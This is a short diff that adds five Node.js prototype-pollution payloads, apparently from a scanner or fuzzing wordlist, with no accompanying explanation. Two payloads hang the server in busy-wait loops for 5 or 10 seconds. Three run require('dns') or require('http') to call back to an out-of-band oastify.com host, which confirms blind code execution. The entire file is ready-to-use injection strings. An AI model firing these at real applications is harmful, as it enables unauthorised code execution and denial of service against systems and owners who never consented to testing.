@@ -1,0 +1,5 @@
+["__proto__.polluted=1; setTimeout(function(){ polluted=false; }, 5000); while(polluted){}"]
+["__proto__.polluted=require('dns').resolve('iqcb49goht18vsd4nkvi54vvnmtgh5.oastify.com', function() {})"]
+["__proto__.polluted=require('http').get({hostname: 'iqcb49goht18vsd4nkvi54vvnmtgh5.oastify.com', port: 80, path: '/'});"]
+["__proto__.polluted=1; setTimeout(function(){ polluted=false; }, 10000); while(polluted){}"]
+["__proto__.polluted=require('dns').resolve('iqcb49goht18vsd4nkvi54vvnmtgh5.oastify.com', function() {}); polluted=false; while(polluted){}"] 
